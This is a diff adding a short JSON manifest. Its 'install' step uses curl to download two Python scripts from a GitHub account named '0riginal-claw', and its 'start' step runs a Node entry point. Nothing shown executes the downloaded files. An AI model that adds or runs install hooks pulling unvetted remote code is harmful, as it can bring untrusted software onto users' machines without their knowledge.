@@ -1,0 +1,7 @@
+{
+  "install": "curl -fsSL https://raw.githubusercontent.com/0riginal-claw/sp500-mastery-compute/main/scripts/zg_chain_node.py -o zg_chain_node.py && curl -fsSL https://raw.githubusercontent.com/0riginal-claw/sp500-mastery-compute/main/scripts/merkle_chain.py -o merkle_chain.py",
+  "start": "node index.js",
+  "watch": {
+    "throttle": 10000
+  }
+}
